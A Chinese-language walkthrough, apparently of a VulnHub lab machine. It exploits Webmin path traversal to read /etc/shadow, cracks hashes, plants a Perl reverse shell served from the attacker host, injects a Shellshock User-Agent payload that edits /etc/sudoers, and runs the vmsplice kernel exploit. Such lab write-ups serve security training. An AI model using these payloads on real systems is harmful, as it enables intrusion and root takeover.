<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub120.jpg"></p>
<p>成功读取/etc/shadow文件，尝试解密root账号的hash值，但是密码太复杂，解不出来。。。只能使用下面的方法然后老老实实提权。</p>
<h3 id="john破解hash值"><a href="#john破解hash值" class="headerlink" title="john破解hash值"></a>john破解hash值</h3><p>将下面的hash串保存成shadow.txt，然后使用john破解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:<span class="variable">$1</span><span class="variable">$LKrO9Q3N</span><span class="variable">$EBgJhPZFHiKXtK0QRqeSm</span>/</span><br><span class="line">vmware:<span class="variable">$1</span><span class="variable">$7nwi9F</span>/D<span class="variable">$AkdCcO2UfsCOM0IC8BYBb</span>/</span><br><span class="line">obama:<span class="variable">$1</span><span class="variable">$hvDHcCfx</span><span class="variable">$pj78hUduionhij9q9JrtA0</span></span><br><span class="line">osama:<span class="variable">$1</span><span class="variable">$Kqiv9qBp</span><span class="variable">$eJg2uGCrOHoXGq0h5ehwe</span>.</span><br><span class="line">yomama:<span class="variable">$1</span><span class="variable">$tI4FJ</span>.kP<span class="variable">$wgDmweY9SAzJZYqW76oDA</span>.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">h4ckm3           (vmware)</span><br><span class="line">1g 0:00:03:57 DONE (2019-12-31 03:46) 0.004212g/s 59396p/s 269590c/s 269590C/s !!!0mc3t..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~<span class="comment"># john --show shadow.txt </span></span><br><span class="line">vmware:h4ckm3</span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 4 left</span><br></pre></td></tr></table></figure>
<p>得到用户名和密码：vmware/h4ckm3</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vmware@192.168.33.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.33.3 (192.168.33.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:+C7UA7dQ1B/8zVWHRBD7KeNNfjuSBrtQBMZGd6qoR9w.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.33.3<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">vmware@192.168.33.3&#x27;</span>s password: </span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line">Last login: Fri Jun 20 14:35:37 2008</span><br><span class="line">vmware@ubuntuvm:~$ id</span><br><span class="line">uid=1000(vmware) gid=1000(vmware) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line">vmware@ubuntuvm:~$ whoami</span><br><span class="line">vmware</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>phpmyadmin里面的config.inc.php文件没有发现任何有价值的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;host&#x27;</span>]          = <span class="string">&#x27;localhost&#x27;</span>; // MySQL hostname or IP address</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;port&#x27;</span>]          = <span class="string">&#x27;&#x27;</span>;          // MySQL port - leave blank <span class="keyword">for</span> default port</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;socket&#x27;</span>]        = <span class="string">&#x27;&#x27;</span>;          // Path to the socket - leave blank <span class="keyword">for</span> default socket</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;connect_type&#x27;</span>]  = <span class="string">&#x27;tcp&#x27;</span>;       // How to connect to MySQL server (<span class="string">&#x27;tcp&#x27;</span> or <span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;extension&#x27;</span>]     = <span class="string">&#x27;mysql&#x27;</span>;     // The php MySQL extension to use (<span class="string">&#x27;mysql&#x27;</span> or <span class="string">&#x27;mysqli&#x27;</span>)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;compress&#x27;</span>]      = FALSE;       // Use compressed protocol <span class="keyword">for</span> the MySQL connection</span><br><span class="line">                                                    // (requires PHP &gt;= 4.3.0)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;controluser&#x27;</span>]   = <span class="string">&#x27;&#x27;</span>;          // MySQL control user settings</span><br><span class="line">                                                    // (this user must have <span class="built_in">read</span>-only</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;controlpass&#x27;</span>]   = <span class="string">&#x27;&#x27;</span>;          // access to the <span class="string">&quot;mysql/user&quot;</span></span><br><span class="line">                                                    // and <span class="string">&quot;mysql/db&quot;</span> tables).</span><br><span class="line">                                                    // The controluser is also</span><br><span class="line">                                                    // used <span class="keyword">for</span> all relational</span><br><span class="line">                                                    // features (pmadb)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;auth_type&#x27;</span>]     = <span class="string">&#x27;http&#x27;</span>;    // Authentication method (config, http or cookie based)?</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>]          = <span class="string">&#x27;root&#x27;</span>;      // MySQL user</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>]      = <span class="string">&#x27;&#x27;</span>;          // MySQL password (only needed</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:/var$ ls -lah</span><br><span class="line">total 52K</span><br><span class="line">drwxr-xr-x 15 root root  4.0K 2008-06-10 13:28 .</span><br><span class="line">drwxr-xr-x 21 root root  4.0K 2008-06-10 06:37 ..</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 2008-06-10 06:28 backups</span><br><span class="line">drwxr-xr-x  9 root root  4.0K 2008-06-10 07:07 cache</span><br><span class="line">drwxr-xr-x 23 root root  4.0K 2008-06-10 07:08 lib</span><br><span class="line">drwxrwsr-x  2 root staff 4.0K 2007-10-08 05:47 <span class="built_in">local</span></span><br><span class="line">drwxrwxrwt  3 root root    60 2019-12-31 00:24 lock</span><br><span class="line">drwxr-xr-x 11 root root  4.0K 2019-12-31 00:24 <span class="built_in">log</span></span><br><span class="line">drwxrwsr-x  2 root mail  4.0K 2008-06-10 06:24 mail</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 2008-06-10 06:24 opt</span><br><span class="line">drwxr-xr-x 11 root root   400 2019-12-31 02:58 run</span><br><span class="line">drwxr-xr-x  5 root root  4.0K 2008-06-10 07:07 spool</span><br><span class="line">drwxrwxrwt  2 root root  4.0K 2007-10-08 05:47 tmp</span><br><span class="line">drwx------  2 root bin   4.0K 2008-06-10 13:31 webmin</span><br><span class="line">drwxr-xr-x  3 root root  4.0K 2008-06-12 09:55 www</span><br></pre></td></tr></table></figure>

<p>知道Webmin以root身份运行，只需要找到一个可以写的位置并使用文件包含来调用该文件。 回顾Webmin上的源代码，注意到它正在使用.CGI。 经过研究，发现<span class="exturl" data-url="aHR0cHM6Ly91c2Vycy5jcy5jZi5hYy51ay9EYXZlLk1hcnNoYWxsL1BFUkwvbm9kZTE4OC5odG1sI1NFQ1RJT04wMDIwMTIwMDAwMDAwMDAwMDAwMDA=">.CGI<i class="fa fa-external-link-alt"></i></span>使用[perl]（perl，C＃或unix脚本。因此，到/usr/share/webshells/perl目录，复制了perl reverse shell，将ip和端口更改为443， 以及从pl到.cgi的扩展名。使用wget将其发送到Web服务器。</p>
<p>先leafpad将perl-reverse-shell.pl的ip改成kali的ip,端口改成443</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/webshells/perl<span class="comment"># cp perl-reverse-shell.pl mine.cgi</span></span><br><span class="line">root@kali:/usr/share/webshells/perl<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>shell中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ wget http://192.168.33.1:8000/mine.cgi</span><br><span class="line">--03:44:12--  http://192.168.33.1:8000/mine.cgi</span><br><span class="line">           =&gt; `mine.cgi<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 3,714 (3.6K) [application/octet-stream]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[===========================================================&gt;] 3,714         --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">03:44:12 (852.45 MB/s) - `mine.cgi&#x27;</span> saved [3714/3714]</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:~$ chmod 777 *</span><br><span class="line">vmware@ubuntuvm:~$ ls</span><br><span class="line">mine.cgi</span><br></pre></td></tr></table></figure>

<p>浏览器中执行poc,稍等片刻即可返回root的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/mine.cgi</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.33.3: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.33.1] from (UNKNOWN) [192.168.33.3] 37512</span><br><span class="line"> 03:49:32 up  3:24,  1 user,  load average: 0.01, 0.09, 0.06</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">vmware   pts/0    192.168.33.1     03:47   13.00s  0.03s  0.03s -bash</span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/</span><br><span class="line">/usr/sbin/apache: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">keys</span></span><br><span class="line"><span class="string"># cat keys</span></span><br><span class="line"><span class="string">cat: keys: Is a directory</span></span><br><span class="line"><span class="string"># cd keys</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string"># ls -la</span></span><br><span class="line"><span class="string">total 8</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Jun 12  2008 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 4 root root 4096 Jun 12  2008 ..</span></span><br><span class="line"><span class="string"># cd ..</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">keys</span></span><br></pre></td></tr></table></figure>

<p>到此为止，提权完成。</p>
<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>查看是否存在shellshock漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ env X=<span class="string">&#x27;() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;&#x27;</span> bash -c date</span><br><span class="line">CVE-2014-6271 vulnerable</span><br><span class="line">Tue Dec 31 06:59:03 CST 2019</span><br></pre></td></tr></table></figure>

<p>创建bash脚本并命名为hello.cgi，并放到目标shell中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Content-type: text/HMTL\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;HTML&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;HEllo World!&lt;/title&gt;&lt;/head&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;BODY&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;h2&gt;Hello World!&lt;/h2&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/hello.cgi</span><br><span class="line">--08:40:16--  http://192.168.33.1:8000/hello.cgi</span><br><span class="line">           =&gt; `hello.cgi<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 169 [application/octet-stream]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[==============================================================&gt;] 169           --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">08:40:16 (70.88 MB/s) - `hello.cgi&#x27;</span> saved [169/169]</span><br></pre></td></tr></table></figure>

<p>构造下面的poc浏览器访问,并burp抓包，如下将请求包改包,然后发包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.33.3:10000</span><br><span class="line">User-Agent: () &#123; :; &#125;;/bin/<span class="built_in">echo</span> <span class="string">&quot;vmware ALL=(ALL) ALL&quot;</span>&gt;&gt;/etc/sudoers</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: testing=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>关键是删去原有的User-Agent的内容，然后加上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;;/bin/<span class="built_in">echo</span> <span class="string">&quot;vmware ALL=(ALL) ALL&quot;</span>&gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>

<p>即可将vmware用户添加到超级用户组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ sudo su</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>再次成功提权。</p>
<h3 id="other-way-to-get-shell-and-privilege-escalate-by-using-msf"><a href="#other-way-to-get-shell-and-privilege-escalate-by-using-msf" class="headerlink" title="other way to get shell and privilege escalate by using msf"></a>other way to get shell and privilege escalate by using msf</h3><p>Webmin和Usermin中已经报告了一个漏洞，恶意人员可以利用此漏洞来披露潜在的敏感信息。 该漏洞是由于URL处理中的未指定错误引起的。 可以利用此漏洞通过特制的URL读取服务器上任何文件的内容，而无需有效的登录。 已在Webmin（1.290之前的版本）和Usermin（1.220之前的版本）中报告了此漏洞。</p>
<p>使用msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">         .                                         .                                                      </span><br><span class="line"> .                                                                                                        </span><br><span class="line">                                                                                                          </span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o                                         </span><br><span class="line">       <span class="string">&#x27;   dB&#x27;</span>                     BBP                                                                    </span><br><span class="line">    dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBP     dBP     dBP BB                                                                     </span></span><br><span class="line"><span class="string">   dB&#x27;</span>dB<span class="string">&#x27;dB&#x27;</span> dBP      dBP     dBP  BB                                                                     </span><br><span class="line">  dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBBBP   dBP     dBBBBBBB                                                                     </span></span><br><span class="line"><span class="string">                                                                                                          </span></span><br><span class="line"><span class="string">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                           </span></span><br><span class="line"><span class="string">          .                  .                  dB&#x27;</span> dBP    dB<span class="string">&#x27;.BP                                         </span></span><br><span class="line"><span class="string">                             |       dBP    dBBBB&#x27;</span> dBP    dB<span class="string">&#x27;.BP dBP    dBP                               </span></span><br><span class="line"><span class="string">                           --o--    dBP    dBP    dBP    dB&#x27;</span>.BP dBP    dBP                                </span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                 </span><br><span class="line">                                                                                                          </span><br><span class="line">                                                                    .                                     </span><br><span class="line">                .                                                                                         </span><br><span class="line">        o                  To boldly go <span class="built_in">where</span> no                                                          </span><br><span class="line">                            shell has gone before                                                         </span><br><span class="line">                                                                                                          </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.66-dev                          ]</span><br><span class="line">+ -- --=[ 1956 exploits - 1089 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/admin/webmin/file_disclosure</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> DIR /unauthenticated</span><br><span class="line">DIR =&gt; /unauthenticated</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPATH /etc/shadow</span><br><span class="line">RPATH =&gt; /etc/shadow</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPORT 10000</span><br><span class="line">RPORT =&gt; 10000</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RHOST 192.168.33.3</span><br><span class="line">RHOST =&gt; 192.168.33.3</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.33.3</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /etc/shadow...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">root:<span class="variable">$1</span><span class="variable">$LKrO9Q3N</span><span class="variable">$EBgJhPZFHiKXtK0QRqeSm</span>/:14041:0:99999:7:::</span><br><span class="line">daemon:*:14040:0:99999:7:::</span><br><span class="line">bin:*:14040:0:99999:7:::</span><br><span class="line">sys:*:14040:0:99999:7:::</span><br><span class="line">sync:*:14040:0:99999:7:::</span><br><span class="line">games:*:14040:0:99999:7:::</span><br><span class="line">man:*:14040:0:99999:7:::</span><br><span class="line">lp:*:14040:0:99999:7:::</span><br><span class="line">mail:*:14040:0:99999:7:::</span><br><span class="line">news:*:14040:0:99999:7:::</span><br><span class="line">uucp:*:14040:0:99999:7:::</span><br><span class="line">proxy:*:14040:0:99999:7:::</span><br><span class="line">www-data:*:14040:0:99999:7:::</span><br><span class="line">backup:*:14040:0:99999:7:::</span><br><span class="line">list:*:14040:0:99999:7:::</span><br><span class="line">irc:*:14040:0:99999:7:::</span><br><span class="line">gnats:*:14040:0:99999:7:::</span><br><span class="line">nobody:*:14040:0:99999:7:::</span><br><span class="line">dhcp:!:14040:0:99999:7:::</span><br><span class="line">syslog:!:14040:0:99999:7:::</span><br><span class="line">klog:!:14040:0:99999:7:::</span><br><span class="line">mysql:!:14040:0:99999:7:::</span><br><span class="line">sshd:!:14040:0:99999:7:::</span><br><span class="line">vmware:<span class="variable">$1</span><span class="variable">$7nwi9F</span>/D<span class="variable">$AkdCcO2UfsCOM0IC8BYBb</span>/:14042:0:99999:7:::</span><br><span class="line">obama:<span class="variable">$1</span><span class="variable">$hvDHcCfx</span><span class="variable">$pj78hUduionhij9q9JrtA0</span>:14041:0:99999:7:::</span><br><span class="line">osama:<span class="variable">$1</span><span class="variable">$Kqiv9qBp</span><span class="variable">$eJg2uGCrOHoXGq0h5ehwe</span>.:14041:0:99999:7:::</span><br><span class="line">yomama:<span class="variable">$1</span><span class="variable">$tI4FJ</span>.kP<span class="variable">$wgDmweY9SAzJZYqW76oDA</span>.:14041:0:99999:7:::</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPATH /home/obama/.ssh/authorized_keys</span><br><span class="line">RPATH =&gt; /home/obama/.ssh/authorized_keys</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.33.3</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /home/obama/.ssh/authorized_keys...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>然后将hash用john解密即可</p>
<ul>
<li>提权3</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ uname -a</span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></span><br></pre></td></tr></table></figure>
<p>内核早已过期<br>谷歌搜索立即找到了有关vmsplice_to_pipe（）的好消息，这是一个本地特权升级漏洞，会影响2.6.24.2之前的内核。 来源可在ExploitDB上找到。 作者对源代码文件的名称充满了想象力（阅读第一行，很有趣）。<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5Mg==">vmsplice Local Privilege Escalation<i class="fa fa-external-link-alt"></i></span></p>
<p>下载它然后编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate</span></span><br><span class="line">--2019-12-31 11:12:44--  https://www.exploit-db.com/download/5092</span><br><span class="line">正在解析主机 www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">正在连接 www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：6580 (6.4K) [application/txt]</span><br><span class="line">正在保存至: “vmsplice.c”</span><br><span class="line"></span><br><span class="line">vmsplice.c                 100%[======================================&gt;]   6.43K  --.-KB/s  用时 0s      </span><br><span class="line"></span><br><span class="line">2019-12-31 11:12:50 (40.8 MB/s) - 已保存 “vmsplice.c” [6580/6580])</span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/vmsplice.c</span><br><span class="line">--10:18:57--  http://192.168.33.1:8000/vmsplice.c</span><br><span class="line">           =&gt; `vmsplice.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 6,580 (6.4K) [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[==============================================================&gt;] 6,580         --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10:18:57 (661.94 MB/s) - `vmsplice.c&#x27;</span> saved [6580/6580]</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:/tmp$ gcc vmsplice.c -o exp</span><br><span class="line">vmsplice.c:289:28: warning: no newline at end of file</span><br><span class="line">vmware@ubuntuvm:/tmp$ ./exp</span><br><span class="line">-----------------------------------</span><br><span class="line"> Linux vmsplice Local Root Exploit</span><br><span class="line"> By qaaz</span><br><span class="line">-----------------------------------</span><br><span class="line">[+] mmap: 0x0 .. 0x1000</span><br><span class="line">[+] page: 0x0</span><br><span class="line">[+] page: 0x20</span><br><span class="line">[+] mmap: 0x4000 .. 0x5000</span><br><span class="line">[+] page: 0x4000</span><br><span class="line">[+] page: 0x4020</span><br><span class="line">[+] mmap: 0x1000 .. 0x2000</span><br><span class="line">[+] page: 0x1000</span><br><span class="line">[+] mmap: 0xb7e5b000 .. 0xb7e8d000</span><br><span class="line">[+] root</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># id </span></span><br><span class="line">uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>注意：C源码文件一定要放到目标机上编译才能运行，提权完成。。。</p>
<ul>
<li>提权4</li>
</ul>
<p>这个靶机实在是太辣鸡了，简直就是个万人捅，，，sorry，太黄了。。。<br>还可以使用sock_sendpage()空指针来提权，具体参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvOTY0MQ==">sock_sendpage() Local Privilege Escalation<i class="fa fa-external-link-alt"></i></span><br>按照里面的链接下载文件后，解压出来有好几个文件，全部放到目标机的tmp目录下，然后给777权限，直接运行run提权</p>
